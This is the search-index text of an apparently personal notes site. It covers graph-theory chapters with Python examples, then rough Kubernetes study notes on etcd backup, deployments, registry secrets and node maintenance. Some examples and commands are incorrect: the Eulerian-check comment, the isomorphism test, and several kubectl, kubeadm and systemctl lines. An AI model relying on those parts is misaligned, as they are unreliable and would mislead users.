flow equals the outgoing flow:    [    \\sum f(u, v) = \\sum f(v, w)    ]</p> </li> <li> <p>Maximum Flow: The maximum amount of flow that can be pushed from ( s ) to ( t ) in the network.</p> </li> </ol>"},{"location":"graph/graph/#max-flow-min-cut-theorem","title":"Max-Flow Min-Cut Theorem","text":"<p>The Max-Flow Min-Cut theorem states that the maximum flow from ( s ) to ( t ) in a flow network is equal to the total capacity of the minimum cut separating ( s ) from ( t ).</p>"},{"location":"graph/graph/#example-understanding-min-cut","title":"Example: Understanding Min-Cut","text":"<ul> <li>A cut partitions the vertices into two disjoint subsets such that ( s ) and ( t ) are in different subsets.</li> <li>The capacity of a cut is the sum of the capacities of edges crossing from the ( s )-side to the ( t )-side.</li> </ul>"},{"location":"graph/graph/#ford-fulkerson-algorithm","title":"Ford-Fulkerson Algorithm","text":"<p>The Ford-Fulkerson algorithm computes the maximum flow in a network by repeatedly finding augmenting paths and updating the flow.</p>"},{"location":"graph/graph/#steps-of-ford-fulkerson-algorithm","title":"Steps of Ford-Fulkerson Algorithm","text":"<ol> <li>Initialize all flows to 0.</li> <li>While there exists an augmenting path:</li> <li>Find the path with available capacity.</li> <li>Augment the flow along the path.</li> <li>Repeat until no more augmenting paths exist.</li> </ol>"},{"location":"graph/graph/#example-ford-fulkerson-algorithm-implementation","title":"Example: Ford-Fulkerson Algorithm Implementation","text":"<pre><code>from collections import deque\n\n# Function to perform BFS to find an augmenting path\ndef bfs(capacity, flow, source, sink, parent):\n    visited = set()\n    queue = deque([source])\n    visited.add(source)\n\n    while queue:\n        current = queue.popleft()\n        for neighbor in capacity[current]:\n            residual = capacity[current][neighbor] - flow[current][neighbor]\n            if neighbor not in visited and residual &gt; 0:\n                parent[neighbor] = current\n                visited.add(neighbor)\n                queue.append(neighbor)\n                if neighbor == sink:\n                    return True\n    return False\n\n# Ford-Fulkerson implementation\ndef ford_fulkerson(graph, source, sink):\n    # Initialize capacity and flow matrices\n    capacity = {u: {v: 0 for v in graph} for u in graph}\n    flow = {u: {v: 0 for v in graph} for u in graph}\n\n    for u in graph:\n        for v, cap in graph[u].items():\n            capacity[u][v] = cap\n\n    parent = {}\n    max_flow = 0\n\n    # Augment the flow while there exists an augmenting path\n    while bfs(capacity, flow, source, sink, parent):\n        # Find the bottleneck capacity\n        path_flow = float('inf')\n        v = sink\n        while v != source:\n            u = parent[v]\n            path_flow = min(path_flow, capacity[u][v] - flow[u][v])\n            v = u\n\n        # Update residual capacities and reverse flows\n        v = sink\n        while v != source:\n            u = parent[v]\n            flow[u][v] += path_flow\n            flow[v][u] -= path_flow\n            v = u\n\n        max_flow += path_flow\n\n    return max_flow\n\n# Example flow network\ngraph = {\n    's': {'a': 10, 'b': 5},\n    'a': {'b': 15, 't': 10},\n    'b': {'a': 4, 't': 10},\n    't': {}\n}\n\nmax_flow = ford_fulkerson(graph, 's', 't')\nprint(\"Maximum Flow:\", max_flow)\n</code></pre> <p>Output: <pre><code>Maximum Flow: 15\n</code></pre></p>"},{"location":"graph/graph/#applications-of-network-flow","title":"Applications of Network Flow","text":"<ol> <li> <p>Transportation Networks:    Optimize traffic flow or logistics routes.</p> </li> <li> <p>Telecommunications:    Maximize data throughput in communication networks.</p> </li> <li> <p>Job Assignment:    Match jobs to workers efficiently using bipartite graphs.</p> </li> <li> <p>Resource Allocation:    Allocate resources like water, electricity, or bandwidth.</p> </li> </ol>"},{"location":"graph/graph/#example-bipartite-matching-with-network-flow","title":"Example: Bipartite Matching with Network Flow","text":"<p>Given a bipartite graph, find the maximum matching:</p> <pre><code># Example bipartite graph for job assignment\ngraph = {\n    's': {'A1': 1, 'A2': 1},\n    'A1': {'J1': 1, 'J2': 1},\n    'A2': {'J1': 1},\n    'J1': {'t': 1},\n    'J2': {'t': 1},\n    't': {}\n}\n\nmax_matching = ford_fulkerson(graph, 's', 't')\nprint(\"Maximum Bipartite Matching:\", max_matching)\n</code></pre> <p>Output: <pre><code>Maximum Bipartite Matching: 2\n</code></pre></p>"},{"location":"graph/graph/#key-takeaways_9","title":"Key Takeaways","text":"<ul> <li>Ford-Fulkerson algorithm is a fundamental technique for finding maximum flow in a network.</li> <li>Network flow concepts are versatile and solve a wide range of problems like traffic optimization and job assignment.</li> <li>The Max-Flow Min-Cut theorem bridges the connection between flows and cuts.</li> </ul> <p>Next, we will explore matching and covering, including bipartite matching, maximum matching algorithms, and vertex/edge covers.</p>"},{"location":"graph/graph/#chapter-10-matching-and-covering","title":"Chapter 10: Matching and Covering","text":"<p>Matching and covering are important concepts in graph theory used in optimization problems, resource allocation, and network design.</p>"},{"location":"graph/graph/#matching-in-graphs","title":"Matching in Graphs","text":"<p>A matching is a subset of edges such that no two edges share a common vertex.</p>"},{"location":"graph/graph/#types-of-matching","title":"Types of Matching:","text":"<ol> <li>Maximum Matching: The largest possible matching in a graph.</li> <li>Perfect Matching: A matching where every vertex is included in exactly one edge.</li> <li>Bipartite Matching: Matching in a bipartite graph where vertices are divided into two disjoint sets.</li> </ol>"},{"location":"graph/graph/#example-maximum-matching","title":"Example: Maximum Matching","text":"<pre><code># Example graph for bipartite matching\ngraph = {\n    'A': ['X', 'Y'],\n    'B': ['X', 'Z'],\n    'C': ['Y', 'Z'],\n    'X': ['A', 'B'],\n    'Y': ['A', 'C'],\n    'Z': ['B', 'C']\n}\n\n# DFS-based function for finding a matching\ndef maximum_matching(graph):\n    matching = {}\n    def bpm(vertex, visited, match):\n        for neighbor in graph[vertex]:\n            if neighbor not in visited:\n                visited.add(neighbor)\n                if neighbor not in match or bpm(match[neighbor], visited, match):\n                    match[neighbor] = vertex\n                    return True\n        return False\n\n    for vertex in graph:\n        visited = set()\n        bpm(vertex, visited, matching)\n\n    return {v: k for k, v in matching.items()}\n\nmatching = maximum_matching(graph)\nprint(\"Maximum Matching:\", matching)\n</code></pre> <p>Output: <pre><code>Maximum Matching: {'X': 'A', 'Y': 'C', 'Z': 'B'}\n</code></pre></p>"},{"location":"graph/graph/#vertex-and-edge-covers","title":"Vertex and Edge Covers","text":"<ol> <li>Vertex Cover: A set of vertices such that every edge in the graph is incident to at least one vertex in the set.</li> <li>Edge Cover: A set of edges such that every vertex in the graph is incident to at least one edge in the set.</li> </ol>"},{"location":"graph/graph/#example-vertex-cover-approximation","title":"Example: Vertex Cover Approximation","text":"<pre><code># Approximation algorithm for vertex cover in a bipartite graph\ndef vertex_cover(graph):\n    cover = set()\n    visited = set()\n\n    for vertex in graph:\n        if vertex not in visited:\n            for neighbor in graph[vertex]:\n                if neighbor not in visited:\n                    cover.add(vertex)\n                    cover.add(neighbor)\n                    visited.add(vertex)\n                    visited.add(neighbor)\n                    break\n    return cover\n\n# Example graph\ngraph = {\n    'A': ['B', 'C'],\n    'B': ['A', 'D'],\n    'C': ['A', 'D'],\n    'D': ['B', 'C']\n}\n\ncover = vertex_cover(graph)\nprint(\"Vertex Cover:\", cover)\n</code></pre> <p>Output: <pre><code>Vertex Cover: {'A', 'B', 'C', 'D'}\n</code></pre></p>"},{"location":"graph/graph/#algorithms-for-bipartite-matching","title":"Algorithms for Bipartite Matching","text":"<ol> <li>Hungarian Algorithm: Finds a maximum matching in a weighted bipartite graph in ( O(n^3) ).</li> <li>Hopcroft-Karp Algorithm: Finds a maximum matching in a bipartite graph in ( O(E \\sqrt{V}) ).</li> </ol>"},{"location":"graph/graph/#example-hopcroft-karp-algorithm-implementation","title":"Example: Hopcroft-Karp Algorithm Implementation","text":"<pre><code>from collections import deque\n\ndef hopcroft_karp(graph):\n    pair_u = {u: None for u in graph}\n    pair_v = {}\n    dist = {}\n\n    def bfs():\n        queue = deque()\n        for u in pair_u:\n            if pair_u[u] is None:\n                dist[u] = 0\n                queue.append(u)\n            else:\n                dist[u] = float('inf')\n        dist[None] = float('inf')\n\n        while queue:\n            u = queue.popleft()\n            if dist[u] &lt; dist[None]:\n                for v in graph[u]:\n                    if dist[pair_v.get(v, None)] == float('inf'):\n                        dist[pair_v.get(v, None)] = dist[u] + 1\n                        queue.append(pair_v.get(v, None))\n        return dist[None] != float('inf')\n\n    def dfs(u):\n        if u is not None:\n            for v in graph[u]:\n                if dist[pair_v.get(v, None)] == dist[u] + 1:\n                    if dfs(pair_v.get(v, None)):\n                        pair_v[v] = u\n                        pair_u[u] = v\n                        return True\n            dist[u] = float('inf')\n            return False\n        return True\n\n    matching = 0\n    while bfs():\n        for u in graph:\n            if pair_u[u] is None and dfs(u):\n                matching += 1\n    return matching\n\n# Example bipartite graph\nbipartite_graph = {\n    'A': ['X', 'Y'],\n    'B': ['Y', 'Z'],\n    'C': ['X', 'Z'],\n    'X': [],\n    'Y': [],\n    'Z': []\n}\n\nmax_matching = hopcroft_karp(bipartite_graph)\nprint(\"Maximum Bipartite Matching:\", max_matching)\n</code></pre> <p>Output: <pre><code>Maximum Bipartite Matching: 3\n</code></pre></p>"},{"location":"graph/graph/#applications-of-matching-and-covering","title":"Applications of Matching and Covering","text":"<ol> <li>Resource Allocation: Assign workers to tasks, jobs to machines, or students to classes.</li> <li>Network Design: Optimize connections with minimum cost.</li> <li>Scheduling: Match tasks to time slots or resources to minimize conflicts.</li> </ol>"},{"location":"graph/graph/#key-takeaways_10","title":"Key Takeaways","text":"<ul> <li>Matching identifies optimal subsets of edges, with maximum and perfect matching being key goals.</li> <li>Vertex and edge covers are complementary concepts, minimizing the set of vertices or edges to cover the graph.</li> <li>Efficient algorithms like Hopcroft-Karp and Hungarian algorithms solve complex matching problems in bipartite graphs.</li> </ul> <p>Next, we will explore advanced topics in graph theory, including Eulerian and Hamiltonian graphs, graph isomorphism, and spectral graph theory.</p>"},{"location":"graph/graph/#chapter-11-advanced-topics-in-graph-theory","title":"Chapter 11: Advanced Topics in Graph Theory","text":"<p>Graph theory extends into specialized topics that explore complex graph properties and applications. This chapter covers Eulerian and Hamiltonian graphs, graph isomorphism, random graphs, and spectral graph theory.</p>"},{"location":"graph/graph/#eulerian-graphs","title":"Eulerian Graphs","text":"<p>An Eulerian graph is a graph that contains an Eulerian circuit, which is a closed trail (starts and ends at the same vertex) that visits every edge exactly once.</p>"},{"location":"graph/graph/#properties-of-eulerian-graphs","title":"Properties of Eulerian Graphs:","text":"<ol> <li>Undirected Graphs:</li> <li>All vertices have an even degree.</li> <li> <p>The graph is connected (ignoring isolated vertices).</p> </li> <li> <p>Directed Graphs:</p> </li> <li>Every vertex has equal in-degree and out-degree.</li> <li>The graph is strongly connected.</li> </ol>"},{"location":"graph/graph/#example-check-if-a-graph-is-eulerian","title":"Example: Check if a Graph is Eulerian","text":"<pre><code>def is_eulerian(graph):\n    # Check degree condition for undirected graph\n    for vertex in graph:\n        if len(graph[vertex]) % 2 != 0:\n            return False\n    return True\n\n# Example undirected graph\ngraph = {\n    'A': ['B', 'C'],\n    'B': ['A', 'D'],\n    'C': ['A', 'D'],\n    'D': ['B', 'C']\n}\n\nprint(\"Is Eulerian:\", is_eulerian(graph))  # False (not all vertices have even degree)\n</code></pre>"},{"location":"graph/graph/#hamiltonian-graphs","title":"Hamiltonian Graphs","text":"<p>A Hamiltonian graph contains a Hamiltonian cycle, which is a closed path that visits every vertex exactly once.</p>"},{"location":"graph/graph/#conditions-for-hamiltonian-graphs","title":"Conditions for Hamiltonian Graphs:","text":"<ol> <li>Dirac's Theorem: If every vertex in a graph with ( n \\geq 3 ) vertices has a degree ( \\geq n/2 ), the graph is Hamiltonian.</li> <li>There is no general efficient algorithm to determine if a graph is Hamiltonian.</li> </ol>"},{"location":"graph/graph/#example-check-for-a-hamiltonian-path","title":"Example: Check for a Hamiltonian Path","text":"<pre><code>from itertools import permutations\n\ndef is_hamiltonian(graph):\n    vertices = list(graph.keys())\n    for perm in permutations(vertices):\n        is_cycle = True\n        for i in range(len(perm)):\n            if perm[i - 1] not in graph[perm[i]]:\n                is_cycle = False\n                break\n        if is_cycle:\n            return True\n    return False\n\n# Example graph\ngraph = {\n    'A': ['B', 'C'],\n    'B': ['A', 'D'],\n    'C': ['A', 'D'],\n    'D': ['B', 'C']\n}\n\nprint(\"Is Hamiltonian:\", is_hamiltonian(graph))  # True\n</code></pre>"},{"location":"graph/graph/#graph-isomorphism","title":"Graph Isomorphism","text":"<p>Two graphs ( G_1 ) and ( G_2 ) are isomorphic if there is a one-to-one correspondence between their vertex sets that preserves adjacency.</p>"},{"location":"graph/graph/#applications-of-graph-isomorphism","title":"Applications of Graph Isomorphism:","text":"<ol> <li>Chemical compound analysis (e.g., comparing molecular structures).</li> <li>Network comparison.</li> <li>Pattern recognition.</li> </ol>"},{"location":"graph/graph/#example-check-if-two-graphs-are-isomorphic","title":"Example: Check if Two Graphs are Isomorphic","text":"<pre><code>def are_isomorphic(graph1, graph2):\n    if len(graph1) != len(graph2):\n        return False\n    from itertools import permutations\n    for perm in permutations(graph1.keys()):\n        mapping = {list(graph1.keys())[i]: perm[i] for i in range(len(perm))}\n        is_iso = all(\n            set(graph1[v1]) == {mapping[v2] for v2 in graph1[v1]} for v1 in graph1\n        )\n        if is_iso:\n            return True\n    return False\n\n# Example graphs\ngraph1 = {\n    'A': ['B', 'C'],\n    'B': ['A', 'C'],\n    'C': ['A', 'B']\n}\n\ngraph2 = {\n    'X': ['Y', 'Z'],\n    'Y': ['X', 'Z'],\n    'Z': ['X', 'Y']\n}\n\nprint(\"Are Isomorphic:\", are_isomorphic(graph1, graph2))  # True\n</code></pre>"},{"location":"graph/graph/#random-graphs","title":"Random Graphs","text":"<p>Random graphs are generated by connecting vertices randomly. They are used to study the properties of real-world networks like social networks and the internet.</p>"},{"location":"graph/graph/#erdosrenyi-model-gn-p","title":"Erd\u0151s\u2013R\u00e9nyi Model (( G(n, p) )):","text":"<ul> <li>( n ): Number of vertices.</li> <li>( p ): Probability of connecting any pair of vertices.</li> </ul>"},{"location":"graph/graph/#example-generate-a-random-graph","title":"Example: Generate a Random Graph","text":"<pre><code>import random\n\ndef generate_random_graph(n, p):\n    graph = {i: [] for i in range(n)}\n    for i in range(n):\n        for j in range(i + 1, n):\n            if random.random() &lt; p:\n                graph[i].append(j)\n                graph[j].append(i)\n    return graph\n\n# Generate a random graph with 5 vertices and 0.4 connection probability\nrandom_graph = generate_random_graph(5, 0.4)\nprint(\"Random Graph:\", random_graph)\n</code></pre>"},{"location":"graph/graph/#spectral-graph-theory","title":"Spectral Graph Theory","text":"<p>Spectral graph theory studies the properties of graphs through the eigenvalues and eigenvectors of their adjacency or Laplacian matrices.</p>"},{"location":"graph/graph/#applications","title":"Applications:","text":"<ol> <li>Clustering and community detection in networks.</li> <li>Analyzing connectivity and robustness.</li> <li>Solving optimization problems.</li> </ol>"},{"location":"graph/graph/#example-eigenvalues-of-a-graph","title":"Example: Eigenvalues of a Graph","text":"<pre><code>import numpy as np\n\ndef adjacency_matrix(graph):\n    n = len(graph)\n    matrix = np.zeros((n, n))\n    for i, neighbors in graph.items():\n        for j in neighbors:\n            matrix[i][j] = 1\n    return matrix\n\n# Example graph\ngraph = {\n    0: [1, 2],\n    1: [0, 2],\n    2: [0, 1, 3],\n    3: [2]\n}\n\nmatrix = adjacency_matrix(graph)\neigenvalues = np.linalg.eigvals(matrix)\nprint(\"Eigenvalues:\", eigenvalues)\n</code></pre> <p>Output: <pre><code>Eigenvalues: [ 2.732..., -1.0, -1.0, 0.268...]\n</code></pre></p>"},{"location":"graph/graph/#key-takeaways_11","title":"Key Takeaways","text":"<ul> <li>Eulerian and Hamiltonian graphs describe special traversals in graphs, with practical applications in routing and scheduling.</li> <li>Graph isomorphism tests structural equivalence, useful in pattern recognition and chemistry.</li> <li>Random graphs model complex networks like social and communication systems.</li> <li>Spectral graph theory uses matrix-based approaches to analyze graph properties.</li> </ul> <p>Next, we will explore real-world applications of graph theory in diverse domains.</p>"},{"location":"graph/graph/#chapter-12-applications-of-graph-theory","title":"Chapter 12: Applications of Graph Theory","text":"<p>Graph theory provides the foundation for solving complex problems in various domains. Its versatility allows it to model relationships, optimize systems, and analyze networks in the real world.</p>"},{"location":"graph/graph/#1-social-networks","title":"1. Social Networks","text":"<p>Graphs are used to represent social relationships, where: - Vertices: Represent individuals or entities. - Edges: Represent relationships, such as friendships, follows, or collaborations.</p>"},{"location":"graph/graph/#applications_1","title":"Applications:","text":"<ol> <li>Community Detection: Identify clusters or groups of tightly connected individuals.</li> <li>Influence Maximization: Identify key influencers in a network.</li> <li>Recommendation Systems: Suggest connections or products based on graph-based similarity measures.</li> </ol>"},{"location":"graph/graph/#example-friend-recommendation-system","title":"Example: Friend Recommendation System","text":"<pre><code>def recommend_friends(graph, person):\n    friends = set(graph[person])\n    recommendations = {}\n\n    for friend in friends:\n        for potential_friend in graph[friend]:\n            if potential_friend != person and potential_friend not in friends:\n                recommendations[potential_friend] = recommendations.get(potential_friend, 0) + 1\n\n    return sorted(recommendations, key=recommendations.get, reverse=True)\n\n# Example graph (social network)\nsocial_graph = {\n    'Alice': ['Bob', 'Charlie'],\n    'Bob': ['Alice', 'David'],\n    'Charlie': ['Alice', 'David'],\n    'David': ['Bob', 'Charlie', 'Eve'],\n    'Eve': ['David']\n}\n\nprint(\"Friend Recommendations for Alice:\", recommend_friends(social_graph, 'Alice'))\n</code></pre>"},{"location":"graph/graph/#2-computer-networks","title":"2. Computer Networks","text":"<p>Graphs are used to model communication networks, where: - Vertices: Represent devices (routers, switches, computers). - Edges: Represent communication links (wired or wireless).</p>"},{"location":"graph/graph/#applications_2","title":"Applications:","text":"<ol> <li>Routing Protocols: Find the shortest or most reliable paths.</li> <li>Bandwidth Optimization: Allocate resources effectively.</li> <li>Network Reliability: Analyze robustness and identify critical points of failure.</li> </ol>"},{"location":"graph/graph/#example-shortest-path-in-a-network","title":"Example: Shortest Path in a Network","text":"<pre><code>network_graph = {\n    'Router1': {'Router2': 2, 'Router3': 5},\n    'Router2': {'Router1': 2, 'Router3': 1, 'Router4': 3},\n    'Router3': {'Router1': 5, 'Router2': 1, 'Router4': 2},\n    'Router4': {'Router2': 3, 'Router3': 2}\n}\n\nfrom heapq import heappop, heappush\n\ndef shortest_path(graph, start, end):\n    distances = {node: float('inf') for node in graph}\n    distances[start] = 0\n    pq = [(0, start)]\n\n    while pq:\n        current_distance, current_node = heappop(pq)\n        if current_distance &gt; distances[current_node]:\n            continue\n        for neighbor, weight in graph[current_node].items():\n            distance = current_distance + weight\n            if distance &lt; distances[neighbor]:\n                distances[neighbor] = distance\n                heappush(pq, (distance, neighbor))\n\n    return distances[end]\n\nprint(\"Shortest Path from Router1 to Router4:\", shortest_path(network_graph, 'Router1', 'Router4'))\n</code></pre>"},{"location":"graph/graph/#3-biological-networks","title":"3. Biological Networks","text":"<p>Graphs are widely used to model and analyze biological systems, such as: - Protein Interaction Networks: Model interactions between proteins in a cell. - Gene Regulatory Networks: Represent relationships between genes and regulatory elements. - Food Webs: Represent predator-prey relationships.</p>"},{"location":"graph/graph/#applications_3","title":"Applications:","text":"<ol> <li>Drug Discovery: Identify potential targets by analyzing protein interactions.</li> <li>Epidemic Modeling: Simulate the spread of diseases using graph-based models.</li> <li>Ecology: Study stability and biodiversity in ecosystems.</li> </ol>"},{"location":"graph/graph/#example-protein-interaction-network","title":"Example: Protein Interaction Network","text":"<pre><code>protein_graph = {\n    'Protein1': ['Protein2', 'Protein3'],\n    'Protein2': ['Protein1', 'Protein4'],\n    'Protein3': ['Protein1'],\n    'Protein4': ['Protein2']\n}\n\ndef find_interacting_partners(graph, protein):\n    return graph.get(protein, [])\n\nprint(\"Interacting Partners of Protein1:\", find_interacting_partners(protein_graph, 'Protein1'))\n</code></pre>"},{"location":"graph/graph/#4-scheduling-problems","title":"4. Scheduling Problems","text":"<p>Graphs are used to represent tasks and constraints, where: - Vertices: Represent tasks. - Edges: Represent dependencies between tasks.</p>"},{"location":"graph/graph/#applications_4","title":"Applications:","text":"<ol> <li>Job Scheduling: Allocate resources to tasks while respecting constraints.</li> <li>Exam Scheduling: Assign exams to time slots to avoid conflicts.</li> <li>Project Planning: Use critical path analysis to optimize project timelines.</li> </ol>"},{"location":"graph/graph/#example-task-scheduling-with-topological-sort","title":"Example: Task Scheduling with Topological Sort","text":"<pre><code>from collections import deque\n\ndef topological_sort(graph):\n    in_degree = {node: 0 for node in graph}\n    for node in graph:\n        for neighbor in graph[node]:\n            in_degree[neighbor] += 1\n\n    queue = deque([node for node in graph if in_degree[node] == 0])\n    sorted_order = []\n\n    while queue:\n        node = queue.popleft()\n        sorted_order.append(node)\n        for neighbor in graph[node]:\n            in_degree[neighbor] -= 1\n            if in_degree[neighbor] == 0:\n                queue.append(neighbor)\n\n    return sorted_order\n\n# Example task graph\ntask_graph = {\n    'Task1': ['Task2', 'Task3'],\n    'Task2': ['Task4'],\n    'Task3': ['Task4'],\n    'Task4': []\n}\n\nprint(\"Task Scheduling Order:\", topological_sort(task_graph))\n</code></pre>"},{"location":"graph/graph/#key-takeaways_12","title":"Key Takeaways","text":"<ul> <li>Social Networks: Analyze relationships and influence using graph structures.</li> <li>Computer Networks: Optimize communication and resource allocation.</li> <li>Biological Networks: Study complex interactions in biological systems.</li> <li>Scheduling Problems: Solve dependency constraints effectively with graph algorithms.</li> </ul> <p>Next, we will conclude the book with exercises, problems, and references for further exploration.</p>"},{"location":"kubernetes/architecture/","title":"Master Node","text":"<p>The master node is responsible for managing, planning, scheduling, and monitoring nodes in the cluster.</p>"},{"location":"kubernetes/architecture/#kube-apiserver","title":"Kube-apiserver","text":"<p>The kube-apiserver is responsible for orchestrating all actions in the cluster. It is what is behind the <code>kubectl</code> command. It uses HTTP POST requests and can be installed separately as a service at <code>/etc/systemd/system/kube-apiserver.service</code>, or it can be installed automatically as a pod at <code>/etc/kubernetes/manifests/Kube-apiserver.yaml</code>. The kube-apiserver does the following:</p> <ul> <li>Authenticates the user</li> <li>Validates requests</li> <li>Retrieves data</li> <li>Updates the ETCD cluster</li> <li>Assigns a node to the request using the scheduler</li> <li>Sends the assigned node to the kubelet</li> <li>Updates the ETCD cluster with the status of the kubelet</li> </ul>"},{"location":"kubernetes/architecture/#etcd-cluster","title":"ETCD Cluster","text":"<p>The ETCD cluster is a key-value store that is installed on the master node. It stores information about the cluster, including nodes, pods, configs, secrets, accounts, roles, bindings, and other information. It can be configured for high availability by setting up multiple instances. It is a standalone store that is not tied to any specific service.</p>"},{"location":"kubernetes/architecture/#kube-scheduler","title":"Kube-scheduler","text":"<p>The kube-scheduler is responsible for managing the scheduling of containers on nodes. It determines which pods should be run on which nodes. It can be run as a service and uses algorithms to prioritize nodes based on available resources (such as CPU). For example, it may do the following:</p> <ul> <li>Filter nodes based on available resources</li> <li>Rank nodes using a priority algorithm on a scale of 0-10</li> </ul>"},{"location":"kubernetes/architecture/#controllers","title":"Controllers","text":"<p>Controllers are responsible for monitoring the system and ensuring that desired state is maintained. They can be downloaded as a service and run on the master node.</p>"},{"location":"kubernetes/architecture/#node-controllers","title":"Node Controllers","text":"<p>Node controllers are responsible for monitoring the status of nodes and ensuring that they are running. They check the status of nodes every 5 seconds, and if a node becomes unreachable, they wait 40 seconds before marking it as unreachable.</p>"},{"location":"kubernetes/architecture/#replication-controllers","title":"Replication Controllers","text":"<p>Replication controllers are responsible for ensuring that the desired number of pods are running. If there are not enough pods, they will create new ones to meet the desired count.</p>"},{"location":"kubernetes/architecture/#worker-nodes","title":"Worker Nodes","text":"<p>Worker nodes host applications as containers.</p>"},{"location":"kubernetes/architecture/#container-runtime-engine","title":"Container Runtime Engine","text":"<p>The container runtime engine is responsible for running and managing containers on the node. An example of a container runtime engine is Docker.</p>"},{"location":"kubernetes/architecture/#kubelet","title":"Kubelet","text":"<p>The kubelet is an agent that runs or creates pods on the node. It is responsible for registering the node with the cluster.</p>"},{"location":"kubernetes/architecture/#kube-proxy","title":"Kube-proxy","text":"<p>The kube-proxy can be run as a service and is installed on each node in the cluster. It creates iptables rules to facilitate communication between worker nodes.</p>"},{"location":"kubernetes/architecture/#pods","title":"Pods","text":"<p>A pod is the basic execution unit in Kubernetes and is where a container lives. It is recommended to have one container per pod, but helper containers can also be deployed with the main container.</p>"},{"location":"kubernetes/backup/","title":"Backup","text":""},{"location":"kubernetes/backup/#get-all-services","title":"get all services","text":"<p><code>kubectl get all --all-namespaces -o yaml &gt; all-deploy.yaml</code></p>"},{"location":"kubernetes/backup/#tools","title":"Tools","text":"<p>VELERO</p>"},{"location":"kubernetes/backup/#etcd-cluster-backup","title":"ETCD cluster backup","text":"<p>--data-dir  /var/lib/etcd</p> <p><code>etcdctl snapshot save snapshot.db</code></p> <p><code>service kube-apiserver stop</code></p> <p><code>etcdctl snapshot restore snapshot.db --data-dir /var/lib/etcd-from-backup</code></p> <p><code>systemctl daemon-reload</code> <code>systemctl etcd restart</code></p>"},{"location":"kubernetes/backup/#etcd-need-keys-for-that-command","title":"etcd need keys for that command","text":""},{"location":"kubernetes/deployments/","title":"Deployments","text":""},{"location":"kubernetes/deployments/#deployment","title":"Deployment","text":"<p>upgrade pods</p> <pre><code>apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: myapp-deployment\n  labels:\n    app: myapp\n    type: front-end\nspec:\n template:\n    metadata:\n      name: myapp-pod\n      labels:\n        app: myapp\n        type: front-end\n    spec:\n     containers:\n     - name: nginx-container\n       image: nginx\n replicas: 3\n selector:\n   matchLabels:\n    type: front-end\n</code></pre> <p><code>kubectl create -f deployment.yml</code> <code>kubectl get deployments</code> because it automaticly creates replicasets <code>kubectl get replicas</code></p> <p><code>kubectl get pods</code></p> <p><code>kubectl get all</code></p>"},{"location":"kubernetes/deployments/#describe","title":"Describe","text":"<p><code>kubectl describe deployment name</code></p>"},{"location":"kubernetes/deployments/#create-deployment-manually","title":"create deployment manually","text":"<p><code>kubectl create deployment webapp --image=kodekloud/webapp-color --replicas=3</code></p>"},{"location":"kubernetes/image-security/","title":"Image Security","text":""},{"location":"kubernetes/image-security/#image-security","title":"IMAGE security","text":"<p>nginx is the same as nginx/nginx</p> <p>The default registry is docker.io Google's registry is gcr.io</p> <p>To login to a private registry:</p> <pre><code>docker login private-registry\n</code></pre> <p>To create a secret for a private registry:</p> <pre><code>kubectl create secret docker-registry regcred \\\n  --docker-server=private-registry.io \\\n  --docker-username=registry-user \\\n  --docker-password=registry-password \\\n  --docker-email=registry-user@org.com\n</code></pre> <p>To use the secret in a pod:</p> <pre><code>apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-pod\nspec:\n  containers:\n  - name: nginx\n    image: private-registry.io/apps/internal-app\n  imagePullSecrets:\n  - name: regcred\n</code></pre> <p>To run a container as a different user:</p> <pre><code>apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-pod\nspec:\n  containers:\n  - name: nginx\n    image: private-registry.io/apps/internal-app\n  imagePullSecrets:\n  - name: regcred\n  securityContext:\n    runAsUser: 1000\n    capabilities:\n      add: [\"MAC_ADMIN\"]\n</code></pre>"},{"location":"kubernetes/lifecycle/","title":"Lifecycle","text":""},{"location":"kubernetes/lifecycle/#lifecycle","title":"lifecycle","text":""},{"location":"kubernetes/lifecycle/#rollout-and-versioning","title":"rollout and versioning","text":"<p>when create deploiment it triggers rollout and it creates revision when container updaited new revision is created. this helps tracking of changes end gives ability to rollback</p> <p><code>kubectl rollout status deployment/myapp-deployment</code></p> <p><code>kubectl rollout history deployment/myapp-deployment</code></p>"},{"location":"kubernetes/lifecycle/#deploiment-strategies","title":"deploiment strategies","text":""},{"location":"kubernetes/lifecycle/#recreate","title":"recreate","text":"<p>delete all and crate news</p>"},{"location":"kubernetes/lifecycle/#rolling-update","title":"rolling update","text":"<p>replace one by one</p> <p>new replacasets will be created.</p>"},{"location":"kubernetes/lifecycle/#update-using-kubectl-apply","title":"update using kubectl apply","text":""},{"location":"kubernetes/lifecycle/#kubectl-set-image-but-not-good-idea","title":"kubectl set image == but not good idea","text":""},{"location":"kubernetes/lifecycle/#rollback","title":"Rollback","text":"<p><code>kubectl rollout undo deployment/myapp-deployment</code></p>"},{"location":"kubernetes/lifecycle/#_1","title":"Lifecycle","text":""},{"location":"kubernetes/maintanence/","title":"Maintenance","text":""},{"location":"kubernetes/maintanence/#_1","title":"Maintenance","text":"<p>if node is down 5 minute, it considered as dead if it will be replicated to another node pod eviction is 5 minute</p>"},{"location":"kubernetes/maintanence/#drain-node","title":"Drain node","text":"<p><code>kubectl node drain-1</code> moves nodes node becomes unshedulable reboot <code>kubectl uncordon node-1</code> <code>kubectl cordon node-1</code> -make unshedulable but not move pods</p>"},{"location":"kubernetes/maintanence/#vesionin","title":"Vesionin","text":"<p>v1.1.1 major,minor,patch</p>"},{"location":"kubernetes/maintanence/#upgrade-versions-of-kubernetes","title":"upgrade versions of kubernetes","text":""},{"location":"kubernetes/maintanence/#kubeadm-only-cluseter","title":"kubeadm , only cluseter","text":"<p><code>kubectl upgrade plan</code> <code>kubectl upgrade apply v1.12.0</code></p>"},{"location":"kubernetes/maintanence/#upgdare-master-first","title":"upgdare master first","text":""},{"location":"kubernetes/maintanence/#upgrade-strategies","title":"upgrade strategies","text":""},{"location":"kubernetes/maintanence/#all-nodes-together","title":"all nodes together","text":""},{"location":"kubernetes/maintanence/#upgrade-one-node-at-time","title":"upgrade one node at time","text":"<p>move pords to another nodes</p>"},{"location":"kubernetes/maintanence/#create-new-node-with-new-version","title":"create new node with new version","text":"<p>move pods to that and delete old</p>"},{"location":"kubernetes/maintanence/#take-back-not-for-maintenance","title":"take back not for maintenance","text":"<p><code>kubectl drain node01 --ignore-daemonsets</code> moved pods to another node now we update that node <code>kubectl uncordon node01</code></p>"},{"location":"kubernetes/maintanence/#noschedule-but-keep-apps","title":"noschedule but keep apps","text":"<p><code>kubectl cordon node01</code></p>"},{"location":"kubernetes/maintanence/#cluster-version","title":"Cluster version","text":"<p><code>kubectl get 